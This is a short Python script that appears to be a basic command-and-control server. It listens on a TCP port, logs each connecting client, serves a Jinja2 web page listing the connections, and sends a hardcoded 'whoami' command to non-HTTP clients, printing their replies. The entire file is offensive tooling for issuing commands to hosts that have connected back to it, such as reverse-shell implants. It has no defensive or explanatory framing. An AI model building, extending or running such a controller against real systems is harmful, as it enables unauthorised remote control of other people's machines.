import socket
import pdb
from optparse import OptionParser
from threading import Thread
from jinja2 import Template


def parse_cli_args():
    parser = OptionParser()
    parser.add_option('-a', '--socket_addr', dest='socket_addr')
    parser.add_option('-p', '--socket_port', dest='socket_port')
    options, args = parser.parse_args()
    return {
        'socket_host': options.socket_addr,
        'socket_port': options.socket_port
    }

opts = parse_cli_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = opts['socket_host'], int(opts['socket_port'])
sock.bind(server_address)
sock.listen(1)


connections = list()
while True:
    # pdb.set_trace()
    connection, client_addr = sock.accept()
    print(f'New conn from {client_addr}')
    connections.append({
        'conn': connection,
        'ip': client_addr[0],
        'port': client_addr[1]
    })
    payload = b'whoami'
    data = connection.recv(1024).decode('utf-8')
    if data.startswith('GET / ') or data.startswith('GET /favicon.ico'):
        print(data)
        connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
        with open('index.html') as file_:
            template = Template(file_.read())
        response = template.render(connections=connections)
        connection.send(response.encode('utf-8'))
        # connection.close()
        continue
    if not data: break
    print(data)
    print(f'{client_addr}: << {data}')
    # payload
    print(f'sending payload to {client_addr}: >> {payload}')
    connection.sendall(payload)
    # render payload result
    response_data = connection.recv(1024)
    print(response_data)